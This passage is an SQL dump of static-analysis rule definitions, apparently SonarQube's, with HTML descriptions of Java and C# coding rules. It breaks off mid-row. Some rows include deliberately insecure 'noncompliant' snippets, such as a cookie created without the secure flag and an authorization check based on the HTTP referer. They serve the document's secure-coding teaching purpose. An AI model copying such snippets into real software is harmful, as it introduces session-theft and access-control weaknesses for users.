INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (683, 'CA1054: URI parameters should not be strings', 'UriParametersShouldNotBeStrings', 'CA1054', 'fxcop', '<h2>Cause</h2>
<p>
            A type declares a method with a string parameter whose name contains "uri", "Uri", "urn", "Urn", "url", or "Url" and the type does not declare a corresponding overload that takes a <code>System.Uri</code> parameter.
</p>
<h2>Rule Description</h2>
<p>
            This rule splits the parameter name into tokens based on the camel casing convention and checks whether each token equals "uri", "Uri", "urn", "Urn", "url", or "Url". If there is a match, the rule assumes that the parameter represents a uniform resource identifier (URI). A string representation of a URI is prone to parsing and encoding errors, and can lead to security vulnerabilities. If a method takes a string representation of a URI, a corresponding overload should be provided that takes an instance of the <code>Uri</code> class, which provides these services in a safe and secure manner.
</p>
<h2>How to Fix Violations</h2>
<p>
            To fix a violation of this rule, change the parameter to a <code>Uri</code> type; this is a breaking change. Alternately, provide an overload of the method which takes a <code>Uri</code> parameter; this is a nonbreaking change.
</p>
<h2>When to Suppress Warnings</h2>
<p>
            It is safe to suppress a warning from this rule if the parameter does not represent a URI.
</p>
<h2>Example</h2>
<p>


                {rule:fxcop:UriPropertiesShouldNotBeStrings}<br/>




                {rule:fxcop:UriReturnValuesShouldNotBeStrings}<br/>




                {rule:fxcop:PassSystemUriObjectsInsteadOfStrings}<br/>




                {rule:fxcop:StringUriOverloadsCallSystemUriOverloads}


</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/ms182174.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182174.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '10min', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812656, 1510817812656, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (684, 'Try-with-resources should be used', 'S2093', NULL, 'squid', '<p>Java 7 introduced the try-with-resources statement, which guarantees that the resource in question will be closed. Since the new syntax is closer
to bullet-proof, it should be preferred over the older <code>try</code>/<code>catch</code>/<code>finally</code> version.</p>
<p>This rule checks that <code>close</code>-able resources are opened in a try-with-resources statement.</p>
<p><strong>Note</strong> that this rule is automatically disabled when the project''s <code>sonar.java.source</code> is lower than <code>7</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
FileReader fr = null;
BufferedReader br = null;
try {
  fr = new FileReader(fileName);
  br = new BufferedReader(fr);
  return br.readLine();
} catch (...) {
} finally {
  if (br != null) {
    try {
      br.close();
    } catch(IOException e){...}
  }
  if (fr != null ) {
    try {
      br.close();
    } catch(IOException e){...}
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
try (
    FileReader fr = new FileReader(fileName);
    BufferedReader br = new BufferedReader(fr)
  ) {
  return br.readLine();
}
catch (...) {}
</pre>
<p>or</p>
<pre>
try (BufferedReader br =
        new BufferedReader(new FileReader(fileName))) { // no need to name intermediate resources if you don''t want to
  return br.readLine();
}
catch (...) {}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/MACfBg">CERT, ERR54-J.</a> - Use a try-with-resources statement to safely handle
  closeable resources </li>
</ul>', 3, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '15min', NULL, NULL, 'cert,java8,pitfall', false, 'HTML', 1510817812660, 1510817812662, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (685, 'Cookies should be "secure"', 'S2092', NULL, 'squid', '<p>The "secure" attribute prevents cookies from being sent over plaintext connections such as HTTP, where they would be easily eavesdropped upon.
Instead, cookies with the secure attribute are only sent over encrypted HTTPS connections.</p>
<h2>Noncompliant Code Example</h2>
<pre>
Cookie c = new Cookie(SECRET, secret);  // Noncompliant; cookie is not secure
response.addCookie(c);
</pre>
<h2>Compliant Solution</h2>
<pre>
Cookie c = new Cookie(SECRET, secret);
c.setSecure(true);
response.addCookie(c);
</pre>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/614">MITRE, CWE-614</a> - Sensitive Cookie in HTTPS Session Without ''Secure'' Attribute </li>
  <li> <a href="https://www.owasp.org/index.php/Top_10_2013-A2-Broken_Authentication_and_Session_Management">OWASP Top Ten 2013 Category A2</a> -
  Broken Authentication and Session Management </li>
  <li> <a href="https://www.owasp.org/index.php/Top_10_2013-A6-Sensitive_Data_Exposure">OWASP Top Ten 2013 Category A6</a> - Sensitive Data Exposure
  </li>
</ul>', 1, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'cwe,owasp-a2,owasp-a6', false, 'HTML', 1510817812663, 1510817812664, 3);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (686, 'Return values should not be ignored when they contain the operation status code', 'S899', NULL, 'squid', '<p>When the return value of a function call contain the operation status code, this value should be tested to make sure the operation completed
successfully.</p>
<p>This rule raises an issue when the return values of the following are ignored:</p>
<ul>
  <li> <code>java.io.File</code> operations that return a status code (except <code>mkdirs</code>) </li>
  <li> <code>Iterator.hasNext()</code> </li>
  <li> <code>Enumeration.hasMoreElements()</code> </li>
  <li> <code>Lock.tryLock()</code> </li>
  <li> non-void <code>Condition.await*</code> methods </li>
  <li> <code>CountDownLatch.await(long, TimeUnit)</code> </li>
  <li> <code>Semaphore.tryAcquire</code> </li>
  <li> <code>BlockingQueue</code>: <code>offer</code>, <code>remove</code>, <code>drainTo</code>, </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
public void doSomething(File file, Lock lock) {
  file.delete();  // Noncompliant
  // ...
  lock.tryLock(); // Noncompliant
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public void doSomething(File file, Lock lock) {
  if (!lock.tryLock()) {
    // lock failed; take appropriate action
  }
  if (!file.delete()) {
    // file delete failed; take appropriate action
  }
}
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 16.10 - If a function returns error information, then that error information shall be tested </li>
  <li> MISRA C++:2008, 0-1-7 - The value returned by a function having a non-void return type that is not an overloaded operator shall always be used.
  </li>
  <li> MISRA C:2012, Dir. 4.7 - If a function returns error information, then that error information shall be tested </li>
  <li> MISRA C:2012, 17.7 - The value returned by a function having non-void return type shall be used </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/w4C4Ag">CERT, ERR33-C.</a> - Detect and handle standard library errors </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/iIBfBw">CERT, POS54-C.</a> - Detect and handle POSIX library errors </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/9gEqAQ">CERT, EXP00-J.</a> - Do not ignore values returned by methods </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/9YIRAQ">CERT, EXP12-C.</a> - Do not ignore values returned by functions </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/eoAyAQ">CERT, EXP12-CPP.</a> - Do not ignore values returned by functions or methods
  </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/toHWAw">CERT, FIO02-J.</a> - Detect and handle file-related errors </li>
  <li> <a href="http://cwe.mitre.org/data/definitions/754">MITRE, CWE-754</a> - Improper Check for Unusual Exceptional Conditions </li>
</ul>', 1, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '15min', NULL, NULL, 'cert,cwe,error-handling,misra', false, 'HTML', 1510817812665, 1510817812666, 3);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (687, 'Resources should be closed', 'S2095', NULL, 'squid', '<p>Connections, streams, files, and other classes that implement the <code>Closeable</code> interface or its super-interface,
<code>AutoCloseable</code>, needs to be closed after use. Further, that <code>close</code> call must be made in a <code>finally</code> block otherwise
an exception could keep the call from being made. Preferably, when class implements <code>AutoCloseable</code>, resource should be created using
"try-with-resources" pattern and will be closed automatically.</p>
<p>Failure to properly close resources will result in a resource leak which could bring first the application and then perhaps the box it''s on to
their knees.</p>
<h2>Noncompliant Code Example</h2>
<pre>
private void readTheFile() throws IOException {
  Path path = Paths.get(this.fileName);
  BufferedReader reader = Files.newBufferedReader(path, this.charset);
  // ...
  reader.close();  // Noncompliant
  // ...
  Files.lines("input.txt").forEach(System.out::println); // Noncompliant: The stream needs to be closed
}

private void doSomething() {
  OutputStream stream = null;
  try {
    for (String property : propertyList) {
      stream = new FileOutputStream("myfile.txt");  // Noncompliant
      // ...
    }
  } catch (Exception e) {
    // ...
  } finally {
    stream.close();  // Multiple streams were opened. Only the last is closed.
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
private void readTheFile(String fileName) throws IOException {
    Path path = Paths.get(fileName);
    try (BufferedReader reader = Files.newBufferedReader(path, StandardCharsets.UTF_8)) {
      reader.readLine();
      // ...
    }
    // ..
    try (Stream&lt;String&gt; input = Files.lines("input.txt"))  {
      input.forEach(System.out::println);
    }
}

private void doSomething() {
  OutputStream stream = null;
  try {
    stream = new FileOutputStream("myfile.txt");
    for (String property : propertyList) {
      // ...
    }
  } catch (Exception e) {
    // ...
  } finally {
    stream.close();
  }
}
</pre>
<h2>Exceptions</h2>
<p>Java 7 introduced the try-with-resources statement, which implicitly closes <code>Closeables</code>. All resources opened in a try-with-resources
statement are ignored by this rule. </p>
<pre>
try (BufferedReader br = new BufferedReader(new FileReader(fileName))) {
  //...
}
catch ( ... ) {
  //...
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/459.html">MITRE, CWE-459</a> - Incomplete Cleanup </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/9gFqAQ">CERT, FIO04-J.</a> - Release resources when they are no longer needed </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/GAGQBw">CERT, FIO42-C.</a> - Close files when they are no longer needed </li>
  <li> <a href="https://docs.oracle.com/javase/tutorial/essential/exceptions/tryResourceClose.html">Try With Resources</a> </li>
</ul>', 4, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'cert,cwe,denial-of-service,leak', false, 'HTML', 1510817812668, 1510817812669, 2);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (688, 'Classes should not be empty', 'S2094', NULL, 'squid', '<p>There is no good excuse for an empty class. If it''s being used simply as a common extension point, it should be replaced with an
<code>interface</code>. If it was stubbed in as a placeholder for future development it should be fleshed-out. In any other case, it should be
eliminated.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class Nothing {  // Noncompliant
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public interface Nothing {
}
</pre>
<h2>Exceptions</h2>
<p>Empty classes can be used as marker types (for Spring for instance), therefore empty classes that are annotated will be ignored.</p>
<pre>
@Configuration
@EnableWebMvc
public final class ApplicationConfiguration {

}
</pre>', 1, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'clumsy', false, 'HTML', 1510817812671, 1510817812671, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (692, '"getClass" should not be used for synchronization', 'S3067', NULL, 'squid', '<p><code>getClass</code> should not be used for synchronization in non-<code>final</code> classes because child classes will synchronize on a
different object than the parent or each other, allowing multiple threads into the code block at once, despite the <code>synchronized</code>
keyword.</p>
<p>Instead, hard code the name of the class on which to synchronize or make the class <code>final</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class MyClass {
  public void doSomethingSynchronized(){
    synchronized (this.getClass()) {  // Noncompliant
      // ...
    }
  }
</pre>
<h2>Compliant Solution</h2>
<pre>
public class MyClass {
  public void doSomethingSynchronized(){
    synchronized (MyClass.class) {
      // ...
    }
  }
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/bwCaAg">CERT, LCK02-J.</a> - Do not synchronize on the class object returned by
  getClass() </li>
</ul>', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'cert,multi-threading', false, 'HTML', 1510817812678, 1510817812678, 2);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (693, '"enum" fields should not be publicly mutable', 'S3066', NULL, 'squid', '<p><code>enum</code>s are generally thought of as constant, but an <code>enum</code> with a <code>public</code> field or <code>public</code> setter is
not only non-constant, but also vulnerable to malicious code. Ideally fields in an <code>enum</code> are <code>private</code> and set in the
constructor, but if that''s not possible, their visibility should be reduced as much as possible.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public enum Continent {

  NORTH_AMERICA (23, 24709000),
  // ...
  EUROPE (50, 39310000);

  public int countryCount;  // Noncompliant
  private int landMass;

  Continent(int countryCount, int landMass) {
    // ...
  }

  public void setLandMass(int landMass) {  // Noncompliant
    this.landMass = landMass;
  }
</pre>
<h2>Compliant Solution</h2>
<pre>
public enum Continent {

  NORTH_AMERICA (23, 24709000),
  // ...
  EUROPE (50, 39310000);

  private int countryCount;
  private int landMass;

  Continent(int countryCount, int landMass) {
    // ...
  }
</pre>', 1, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '20min', NULL, NULL, 'bad-practice', false, 'HTML', 1510817812679, 1510817812680, 3);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (694, '"Stream" call chains should be simplified when possible', 'S4034', NULL, 'squid', '<p>The Stream API provides the <code>boolean anyMatch(Predicate&lt;? super T&gt; predicate)</code> method, which is a very convenient and efficient
way to check whether any elements of a stream match the provided predicate.</p>
<p>This rule raises an issue when a <code>Stream</code> chain could be replaced by this method call. Specifically:</p>
<ul>
  <li> <code>filter(Predicate&lt;? super T&gt; predicate).findFirst().isPresent()</code> </li>
  <li> <code>filter(Predicate&lt;? super T&gt; predicate).findAny().isPresent()</code> </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
boolean hasRed = widgets.stream().filter(w -&gt; w.getColor() == RED).findFirst().isPresent(); // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
boolean hasRed = widgets.stream().anyMatch(w -&gt; w.getColor() == RED);
</pre>', 1, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '2min', NULL, NULL, 'clumsy', false, 'HTML', 1510817812681, 1510817812681, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (695, 'Modifiers should be declared in the correct order', 'ModifiersOrderCheck', 'S1124', 'squid', '<p>The Java Language Specification recommends listing modifiers in the following order:</p>
<p>1. Annotations</p>
<p>2. public</p>
<p>3. protected</p>
<p>4. private</p>
<p>5. abstract</p>
<p>6. static</p>
<p>7. final</p>
<p>8. transient</p>
<p>9. volatile</p>
<p>10. synchronized</p>
<p>11. native</p>
<p>12. strictfp</p>
<p>Not following this convention has no technical impact, but will reduce the code''s readability because most developers are used to the standard
order.</p>
<h2>Noncompliant Code Example</h2>
<pre>
static public void main(String[] args) {   // Noncompliant
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public static void main(String[] args) {   // Compliant
}
</pre>', 1, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '2min', NULL, NULL, 'convention', false, 'HTML', 1510817812682, 1510817812682, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (957, 'Collection.isEmpty() should be used to test for emptiness', 'S1155', NULL, 'squid', '<p>Using <code>Collection.size()</code> to test for emptiness works, but using <code>Collection.isEmpty()</code> makes the code more readable and can
be more performant. The time complexity of any <code>isEmpty()</code> method implementation should be <code>O(1)</code> whereas some implementations
of <code>size()</code> can be <code>O(n)</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if (myCollection.size() == 0) {  // Noncompliant
  /* ... */
}
</pre>
<h2>Compliant Solution</h2>
<pre>
if (myCollection.isEmpty()) {
  /* ... */
}
</pre>', 1, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '2min', NULL, NULL, 'clumsy', false, 'HTML', 1510817813003, 1510817813003, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (696, 'Equality operators should not be used in "for" loop termination conditions', 'S888', NULL, 'squid', '<p>Testing <code>for</code> loop termination using an equality operator (<code>==</code> and <code>!=</code>) is dangerous, because it could set up an
infinite loop. Using a broader relational operator instead casts a wider net, and makes it harder (but not impossible) to accidentally write an
infinite loop.</p>
<h2>Noncompliant Code Example</h2>
<pre>
for (int i = 1; i != 10; i += 2)  // Noncompliant. Infinite; i goes from 9 straight to 11.
{
  //...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
for (int i = 1; i &lt;= 10; i += 2)  // Compliant
{
  //...
}
</pre>
<h2>Exceptions</h2>
<p>Equality operators are ignored if the loop counter is not modified within the body of the loop and either:</p>
<ul>
  <li> starts below the ending value and is incremented by 1 on each iteration. </li>
  <li> starts above the ending value and is decremented by 1 on each iteration. </li>
</ul>
<p>Equality operators are also ignored when the test is against <code>null</code>.</p>
<pre>
for (int i = 0; arr[i] != null; i++) {
  // ...
}

for (int i = 0; (item = arr[i]) != null; i++) {
  // ...
}
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C++:2008, 6-5-2 </li>
  <li> <a href="http://cwe.mitre.org/data/definitions/835">MITRE, CWE-835</a> - Loop with Unreachable Exit Condition (''Infinite Loop'') </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/EwDJAQ">CERT, MSC21-C.</a> - Use robust loop termination conditions </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/GwDJAQ">CERT, MSC21-CPP.</a> - Use inequality to terminate a loop whose counter changes
  by more than one </li>
</ul>', 3, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '2min', NULL, NULL, 'cert,cwe,misra,suspicious', false, 'HTML', 1510817812683, 1510817812683, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (697, 'Duplicate values should not be passed as arguments', 'S4142', NULL, 'squid', '<p>There are valid cases for passing a variable multiple times into the same method call, but usually doing so is a mistake, and something else was
intended for one of the arguments.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if (compare(myPoint.x, myPoint.x) != 0) { // Noncompliant
&nbsp;&nbsp;//...
}

if (compare(getNextValue(), getNextValue()) != 0) { // Noncompliant
&nbsp;&nbsp;// ...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
if (compare(myPoint.x, myPoint.y) != 0) {
&nbsp;&nbsp;//...
}

Object v1 = getNextValue();
Object v2 = getNextValue();
if (compare(v1, v2) != 0) {
&nbsp;&nbsp;// ...
}
</pre>', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'suspicious', false, 'HTML', 1510817812684, 1510817812685, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (698, 'Fields should not be initialized to default values', 'S3052', NULL, 'squid', '<p>The compiler automatically initializes class fields to their default values before setting them with any initialization values, so there is no need
to explicitly set a field to its default value. Further, under the logic that cleaner code is better code, it''s considered poor style to do so.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class MyClass {

  int count = 0;  // Noncompliant
  // ...

}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class MyClass {

  int count;
  // ...

}
</pre>
<h2>Exceptions</h2>
<p><code>final</code> fields are ignored.</p>', 1, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '2min', NULL, NULL, 'convention,finding', false, 'HTML', 1510817812685, 1510817812686, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (699, 'Map values should not be replaced unconditionally', 'S4143', NULL, 'squid', '<p>It is highly suspicious when a value is saved for a key or index and then unconditionally overwritten. Such replacements are likely in error.</p>
<h2>Noncompliant Code Example</h2>
<pre>
letters.put("a", "Apple");
letters.put("a", "Boy");  // Noncompliant

towns[i] = "London";
towns[i] = "Chicago";  // Noncompliant
</pre>', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'suspicious', false, 'HTML', 1510817812686, 1510817812687, 2);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (701, 'HTTP referers should not be relied on', 'S2089', NULL, 'squid', '<p>The fields in an HTTP request are putty in the hands of an attacker, and you cannot rely on them to tell you the truth about anything. While it may
be safe to store such values after they have been neutralized, decisions should never be made based on their contents.</p>
<p>This rule flags uses of the referer header field.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class MyServlet extends HttpServlet {
  protected void doPost(HttpServletRequest request, HttpServletResponse response)
        throws ServletException, IOException {
    String referer = request.getHeader("referer");  // Noncompliant
    if(isTrustedReferer(referer)){
      //..
    }
    //...
  }
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/807">MITRE, CWE-807</a> - Reliance on Untrusted Inputs in a Security Decision </li>
  <li> <a href="http://cwe.mitre.org/data/definitions/293">MITRE, CWE-293</a> - Using Referer Field for Authentication </li>
  <li> <a href="http://www.sans.org/top25-software-errors/">SANS Top 25</a> - Porous Defenses </li>
  <li> <a href="https://www.owasp.org/index.php/Top_10_2013-A2-Broken_Authentication_and_Session_Management">OWASP Top Ten 2013 Category A2</a> -
  Broken Authentication and Session Management </li>
</ul>', 3, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '20min', NULL, NULL, 'cwe,owasp-a2,sans-top25-porous', false, 'HTML', 1510817812689, 1510817812689, 3);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (702, 'Local constants should follow naming conventions for constants', 'S4174', NULL, 'squid', '<p>Shared coding conventions allow teams to collaborate efficiently. This rule checks that all local, <code>final</code>, initialized, primitive
variables, have names that match a provided regular expression.</p>
<h2>Noncompliant Code Example</h2>
<p>With the default regular expression <code>^[A-Z][A-Z0-9]*(_[A-Z0-9]+)*$</code>:</p>
<pre>
public void doSomething() {
  final int local = 42;
  ...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public void doSomething() {
  final int LOCAL = 42;
  ...
}
</pre>', 1, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'convention', false, 'HTML', 1510817812690, 1510817812690, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (703, '"java.nio.Files#delete" should be preferred', 'S4042', NULL, 'squid', '<p>When <code>java.io.File#delete</code> fails, this <code>boolean</code> method simply returns <code>false</code> with no indication of the cause. On
the other hand, when <code>java.nio.Files#delete</code> fails, this <code>void</code> method returns one of a series of exception types to better
indicate the cause of the failure. And since more information is generally better in a debugging situation, <code>java.nio.Files#delete</code> is the
preferred option.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public void cleanUp(Path path) {
  File file = new File(path);
  if (!file.delete()) {  // Noncompliant
    //...
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public void cleanUp(Path path) throws NoSuchFileException, DirectoryNotEmptyException, IOException{
  Files.delete(path);
}
</pre>', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '10min', NULL, NULL, 'api-design,error-handling', false, 'HTML', 1510817812692, 1510817812693, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (704, 'Comments should not be located at the end of lines of code', 'TrailingCommentCheck', 'S139', 'squid', '<p>This rule verifies that single-line comments are not located at the ends of lines of code. The main idea behind this rule is that in order to be
really readable, trailing comments would have to be properly written and formatted (correct alignment, no interference with the visual structure of
the code, not too long to be visible) but most often, automatic code formatters would not handle this correctly: the code would end up less readable.
Comments are far better placed on the previous empty line of code, where they will always be visible and properly formatted.</p>
<h2>Noncompliant Code Example</h2>
<pre>
int a1 = b + c; // This is a trailing comment that can be very very long
</pre>
<h2>Compliant Solution</h2>
<pre>
// This very long comment is better placed before the line of code
int a2 = b + c;
